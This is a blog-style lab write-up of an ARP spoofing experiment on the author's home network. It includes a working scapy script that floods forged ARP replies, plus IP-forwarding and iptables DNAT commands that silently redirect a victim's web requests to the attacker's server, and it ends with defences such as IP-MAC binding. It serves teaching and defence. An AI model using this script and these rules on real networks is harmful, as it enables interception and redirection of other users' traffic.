---
layout: post
title: ARP Spoofing Experiment
categories:
- Computer Network
tags:
- Network Security
---

ARP spoofing is a technique by which the attacker send forged Address Resolution Protocol (ARP) packets into a local area networl(LAN).

<!-- ## IP and MAC
The ARP is used for translate between IP adsress and MAC address.
IP address and MAC address serve different purposes in the network stack: 
- The MAC address (Media Access Control) is a unique identifier assigned to a network interface card (NIC), It operates at the **Data Link Layer**, used for communication within the same physical or logical LAN segment.
- The IP address (Internet Protocol) is a logical identifier assigned to a device for communication across different networks. It operates at the **Network Layer**, used for communication across different networks.

Within LAN, communication is handled using MAC address. For devices outside the LAN, communication requires IP addresses because MAC addresses are not routable across networks.

When a device in a LAN communicates with another device:
1. The sender uses the destination IP address to determine where the data should go.
2. Using the Address Resolution Protocol (ARP), the sender **maps** the destination IP address to the corresponding MAC address.
3. The data is encapsulated into a **frame** with the MAC address for delivery within the LAN.
4. If the destination is outside the LAN, the frame is sent to the router's MAC address, and the router handles forwarding the data to the next network using the destination IP.

That is, hosts in LAN don't know the MAC address of the target host initially. That is the ARP comes to play. But why we need both of them? Obviously only have MAC address is not working for host outside the LAN, but it seems the just the IP address is enough, becaus every host within the same LAN will has different IP address.

In essence, hosts within a LAN initially do not know the MAC address of the target host. This is where ARP comes into play. But why do we need both IP and MAC addresses?

Clearly, relying only on MAC addresses would not work for communication with hosts outside the LAN. However, it might seem that using just IP addresses would suffice since every host within the same LAN has a unique IP address. The need for both addresses arises because each serves a distinct purpose: IP addresses are used for end-to-end communication across networks, while MAC addresses are used for local delivery within a single LAN. This separation allows the network to maintain layer independence and ensures efficient data transmission.

> There are several reasons why hosts and router interfaces have MAC addresses in a­ ddition to network-layer addresses. First, LANs are designed for arbitrary network-layer protocols, not just for IP and the Internet. If adapters were assigned IP addresses rather than “neutral” MAC addresses, then adapters would not easily be able to support other network-layer protocols (for example, IPX or DECnet). Second, if adapters were to use network-layer addresses instead of MAC addresses, the network-layer address would have to be stored in the adapter RAM and reconfigured every time the adapter was moved (or powered up)....
>
> — *Computer Networking: A Top-Down Approach*, Section 6.4.1

The reason is that even when communicating within the same LAN, data still needs to be delivered to specific devices. In Ethernet, data link layer frames are transferred using MAC addresses as the destination. Switches and network cards only understand MAC addresses, they don't know how to send data based on IP addresses. Without the MAC address, the device cannot actually send data to the destination.

### An Analogy
To understand why both IP addresses and MAC addresses are essential in a LAN, let’s use a analogy based on a package delivery system in a residential area.

Imagine you live in an apartment complex (a LAN), and a courier is trying to deliver a package to you. Here's how the delivery process mirrors network communication:

#### The Apartment Complex Address = IP Address
The IP address serves as the logical identifier, similar to your apartment complex's address (e.g., "123 Main Street"). This helps the courier locate your complex within the city. However, once the courier arrives, the IP address alone isn't enough. It doesn't specify your exact apartment number.

#### Your Apartment Number = MAC Address
The MAC address is like your apartment number (e.g., "Unit 6B"). Once the courier reaches the complex, they need your apartment number to deliver the package directly to you. Without it, the package cannot be handed over to the right person.

If there were no apartment numbers (MAC addresses), the courier would have to guess or shout out loud: "Hey! Is anyone here waiting for a package from XYZ?" (This is like broadcasting in a LAN).

With the combined use of IP addresses and MAC addresses, we can ensure that data packets are delivered accurately and efficiently to their intended destinations.

#### ARP = Asking for Apartment Numbers
When the host only knows the destination IP address, it uses the **Address Resolution Protocol (ARP)** to find the corresponding MAC address:

The courier arrives at the complex (LAN) with the package but doesn’t know your apartment number. To find out, they ask the building manager (acting like ARP): “Which apartment belongs to John at 123 Main Street?” The building manager checks their records and provides the corresponding apartment number (MAC address). Now the courier can deliver the package directly to your door.

In the delivery analogy, the process of ARP (Address Resolution Protocol) can be directly mapped to the steps a courier takes to find the right apartment number (MAC address) when they only know the apartment complex address (IP address). Here’s the detailed correspondence:

| ARP Terminology              | Delivery Analogy |    
| :--------------------------- | :--------------- |
| IP Address                   | The apartment complex address (e.g., "123 Main Street").     | 
| MAC Address                  | The apartment number (e.g.,     "Unit 6B").                      | 
| ARP Request                  | The courier asks the building manager: "Which apartment belongs to John at 123 Main Street?" | 
|Broadcast|The courier shouts to everyone in the complex: "Who is John living at 123 Main Street?"|
|ARP Reply	|The building manager (or John) responds: "John lives in Unit 6B."|
|ARP Table	|The building manager’s records of which resident lives in which apartment (a cache of IP-to-MAC mappings).|
|Default Gateway’s MAC Address	|The front desk or main office of the complex (router). If the courier cannot find John, they might leave the package there for further delivery.|

## ARP Spoofing
Assume you already unstand how ARP works, you may notice there is some vulnerabilities in this process.
The courier asks, "Who is John? What is his apartment number?" (ARP Request). Normally John replies, "I live in Unit 6B (MAC Address)." But what if The attacker, Mike, lives in Unit 6A (another MAC address) and overhears the courier asking and falsely claims, "I am John, and I live in Unit 6A!" (Fake ARP Reply). The courier, trusting the first response, delivers John’s package to Unit 6A (the attacker's apartment). Mike now has John’s package, and John never receives it.

In order to perform ARP spoofing, we need to forge the misleading ARP reply, change the IP address in the ARP packet into the one you want the packet to deliver to. -->



## IP and MAC
The ARP protocol translates between IP addresses and MAC addresses, which serve different purposes in the network stack:
- MAC Address: A unique identifier at the Data Link Layer, used for communication within a LAN.
- IP Address: A logical identifier at the Network Layer, used for communication across different networks.

Within a LAN, communication relies on MAC addresses, while devices outside the LAN require IP addresses for routing. ARP maps IP addresses to MAC addresses, enabling data to be encapsulated in frames for delivery within the LAN.

## Why Do We Need Both
> There are several reasons why hosts and router interfaces have MAC addresses in a­ ddition to network-layer addresses. First, LANs are designed for arbitrary network-layer protocols, not just for IP and the Internet. If adapters were assigned IP addresses rather than “neutral” MAC addresses, then adapters would not easily be able to support other network-layer protocols (for example, IPX or DECnet). Second, if adapters were to use network-layer addresses instead of MAC addresses, the network-layer address would have to be stored in the adapter RAM and reconfigured every time the adapter was moved (or powered up)....
>
> — *Computer Networking: A Top-Down Approach*, Section 6.4.1

Relying only on MAC addresses doesn’t work for inter-network communication, while using only IP addresses is insufficient for local delivery since switches and network cards only understand MAC addresses. This separation ensures layer independence and efficient data transmission.

Think of a LAN as an apartment complex. The IP address is like the complex address, helping the courier find the building, while the MAC address is like the apartment number, specifying the exact recipient. Without the apartment number, the courier (data link layer) can’t deliver the package (frame) to the right person.

Using ARP is like asking the building manager: “Which apartment belongs to John?” The manager (the recipient) provides the apartment number (MAC address), enabling delivery.

## ARP Spoofing
In ARP spoofing, an attacker intercepts this process. When the courier asks, “Who is John?” the attacker falsely claims to be John and provides their own apartment number (MAC address). As a result, the package (data) is delivered to the attacker instead of the intended recipient. This vulnerability arises because ARP relies on trust in responses without verification.
 
### Environment Setup
For this demonstration, I will use a RaspberryPi as the attacker, a Windows machine as the victim, and a MacBook as the third device running a simple web server. The IP addresses and MAC addresses for each device are summarized in the table below:

| Host                      | IP Address         | MAC Address        |       
| :------------------------ | :---------------   |
|MacBook     (server)       | 192.168.1.108      | 8e:74:1b:52:ad:3e  |
|Windows11   (victim)       | 192.168.1.111      | 10:7c:61:61:f6:cd  |
|raspberryPi (attacker)     | 192.168.1.100      | d8-3a-dd-5a-bf-ae  |

### Before the Attack
In the Macbook, run the below scrip to creat a simple web server:
``` python
from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Send HTTP response code 200 (OK)
        self.send_response(200)
        # Set the content type of the response
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Write the response body
        self.wfile.write(b"Hello, this is a simple web server running on mac!")

host = "0.0.0.0" 
port = 8080      

server = HTTPServer((host, port), SimpleHTTPRequestHandler)

print(f"Starting server on {host}:{port}")
server.serve_forever()
```

After setting up the server, we can access it using a web browser or the `curl` command:
``` shell
curl 192.168.1.108:8080
```
This will return the following output:

![Desktop View](assets/img/arp/Screenshot 2024-12-02 184913.png){: width="972" height="589" }

The response confirms that the content is served by the Mac's web server.
If the Windows mechine ping the Mac server:
``` shell
ping 192.168.1.108
```
Everything is normal:

![Desktop View](assets/img/arp/b.png){: width="972" height="589" }

Analyzing the TCP packets captured in Wireshark, we can observe that the IP-MAC pair matches the table above:

![Desktop View](assets/img/arp/Screenshot 2024-12-02 at 19.53.26.png){: width="972" height="589" }

When executing the curl command, the victim establishes a TCP connection with the Mac server. The packets exchanged between them clearly show the right MAC addresses of both devices.

### ARP Packet Structure
Before we preform the attack, it's essential to understand the structure of an ARP packet.
The principal packet structure of ARP packets is shown in the following picture which illustrates the case of IPv4 networks running on Ethernet.

![Desktop View](/assets/img/arp/Screenshot 2024-11-30 at 22.38.39.png){: width="972" height="589" }

Using Wireshark, we can capture ARP packets and examine them to compare their structure with the ARP packet format:

![Desktop View](assets/img/arp/Screenshot 2024-12-02 at 20.08.16.png){: width="972" height="589" }

In the Ethernet section of the packet details, we can see that it contains the Mac server's MAC and IP addresses, as well as the target's MAC and IP addresses. This specific packet is a valid ARP packet sent by the Mac server to the Windows machine, correctly mapping the IP-MAC address pair and confirming that the MAC address `8e:74:1b:52:ad:3e` is associated with the IP address `192.168.1.108`.

### Forge a Malicious ARP Packet
To perform the attack, we need to modify the ARP packets and send them into the LAN, tricking the victim into believing that the MAC address corresponding to the IP address `192.168.1.108` is the attacker's MAC address. Thus, when the victim want to access the IP `192.168.1.108`, all the traffic it initiates is directed to the attacker instead of the original Mac web server.

To verify whether the spoofing is effective, we need to check the ARP table on the Windows machine. Open PowerShell as an administrator and run the following command:
``` shell
arp -a
```
This will display all the ARP table entries on the host.

![Desktop View](assets/img/arp/Screenshot 2024-12-02 at 20.31.25.png){: width="972" height="589" }

What we need to modify is only the MAC field in the packet structure. The following Python script achieves this using the `scapy` module:
```python
import time
from scapy.all import ARP, Ether, sendp

arp_packet = ARP(
    op = 2,     # ARP reply
    psrc = "192.168.1.108",         
    hwsrc = "d8:3a:dd:5a:bf:ae",    # Attacker's MAC address
    pdst="192.168.1.111", 
    hwdst="10:7c:61:61:f6:cd"
)

eth_packet = Ether(
    dst="10:7c:61:61:f6:cd",  
    src="d8:3a:dd:5a:bf:ae",        # Attacker's MAC address
    type=0x0806 
) / arp_packet

while True:
    sendp(eth_packet, verbose=1)
    time.sleep(2)
```

> If you perform ARP spoofing in a virtual machine (VM) with its network adapter set to bridge mode, Wireshark running inside the VM will show that the ARP packet's MAC address field is modified as expected. However, the victim will receive the host machine's MAC address instead of the VM's. This occurs because Wi-Fi client devices cannot send frames with multiple MAC addresses. The MAC address of the Wi-Fi adapter connected to the access point (AP) is used for all outgoing frames.To use a VM as a gateway, you must have either a dedicated Wi-Fi adapter assigned to the VM or a wired Ethernet connection for the host machine.
{: .prompt-warning }

After running this script, it will continuously send forged ARP packets into the LAN. When the victim receives these packets, it will overwrite the ARP table entry for the IP address `192.168.1.108` with the attacker's MAC address `d8:3a:dd:5a:bf:ae`. We can observe that the victim has received numerous forged ARP packets:

![Desktop View](assets/img/arp/Screenshot 2024-12-02 at 20.40.05.png){: width="972" height="589" }

Compared to the normal ARP packets sent by the Mac server to the victim, the only change is that the sender's MAC address has been replaced with the attacker's.

Checking the victim's ARP table:

![Desktop View](assets/img/arp/c.png){: width="972" height="589" }

At this point, the attack is halfway complete. If the victim tries to ping the Mac server, it won’t receive a reply!

![Desktop View](assets/img/arp/Screenshot 2024-12-02 205443.png){: width="972" height="589" }

### Enable IP forwarding

In the above image, the destination IP address of the ICMP packets is `192.168.1.108`, but the MAC address belongs to the attacker `d8:3a:dd:5a:bf:ae`. When these packets reach the attacker, they will be dropped by default because they are not truly intended for the attacker. However, to avoid raising suspicion and maintain the victim's perception of normal network behavior, we can enable IP forwarding on the attacker’s machine:
``` shell
sudo sysctl -w net.ipv4.ip_forward=1
```

When the victim attempts to ping:

![Desktop View](assets/img/arp/Screenshot 2024-12-02 210852.png){: width="972" height="589" }

We can observe that the ICMP request initiated by the victim reaches the attacker. The attacker then forwards this request to the Mac server, allowing the server to send a reply back to the victim. The victim receives the correct ICMP reply with the IP address `192.168.1.108` and the MAC address `8e:74:1b:52:ad:3e`. Although each request's MAC address is that of the attacker, the victim ultimately receives the proper ICMP reply.

> You can also use a Python script to manually forge ICMP packets and even simulate an entire TCP connection.
{: .prompt-tip }

The ICMP packets will be automatically forwarded if IP forwarding is enabled. To deceive the victim into believing it is accessing the Mac server, while in reality, it is connecting to the server running on the Raspberry Pi, we need to add a specific rule to the IP forwarding configuration:
``` shell
sudo iptables -t nat -A PREROUTING -p tcp -s 192.168.1.111 -d 192.168.1.108 --dport 8080 -j DNAT --to-destination 192.168.1.100:8080
sudo iptables -A FORWARD -p tcp -s 192.168.1.111 -d 192.168.1.100 --dport 8080 -j ACCEPT
```
Run the following command to view NAT forwarding rules:
``` shell
sudo iptables -t nat -L -n -v
```

![Desktop View](assets/img/arp/Screenshot 2024-12-02 at 21.26.42.png){: width="972" height="589" }

Next, set up the same web server on the attacker's machine, but modify the response body to distinguish between the Mac server and the attacker's server:
``` python
...
# Write the response body
self.wfile.write(b"Hello, this is a simple web server running on raspberryPi!")
...
```


Finally, attempt to access the web server from the victim machine:
``` shell
curl 192.168.1.108:8080
```
![Desktop View](assets/img/arp/a.png){: width="972" height="589" }

As expected, although the victim requested the same IP address, the content shows that the message was sent from the attacker's server, not the Mac server!

## Summary
Initially, I attempted ARP spoofing using specialized tools like `bettercap`. By default, these tools impersonate the gateway router (e.g., `192.168.1.1`). This approach is highly dangerous because it allows the attacker to intercept all traffic between the victim and the gateway router. With a simple IP forwarding rule on port 80, the attacker can monitor all web traffic initiated by the victim, effectively placing it under the attacker's control.

Most routers prevent this type of attack by verifying the IP-MAC pair associated with their own IP address. For example, if the router detects an ARP packet claiming the IP `192.168.1.1` but with a MAC address that does not belong to the router, it will simply drop the packet. However, this verification is typically limited to the router's own IP address and does not extend to other ARP packets on the network.

One effective way to prevent ARP spoofing is IP-MAC address binding. By binding specific IP addresses to their corresponding MAC addresses, the router enforces the preset IP-MAC pairs and rejects any ARP packets that deviate from these bindings.